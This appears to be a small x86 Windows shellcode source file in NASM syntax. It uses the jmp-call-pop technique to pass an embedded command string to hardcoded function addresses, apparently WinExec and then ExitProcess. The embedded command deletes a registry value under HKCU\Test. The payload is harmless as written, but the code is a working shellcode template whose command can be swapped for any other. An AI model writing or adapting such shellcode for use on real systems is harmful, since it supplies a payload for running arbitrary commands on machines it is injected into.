[BITS 32]
section .text
global _start

_start:
    jmp short get_command

execute_command:
    pop ebx
    push ebx
    mov ecx, 0x771C45F0
    call ecx
    mov ebx, 0x7718ADF0
    call ebx

get_command:
    call execute_command
    db 'REG DELETE HKCU\Test /v test /f', 0



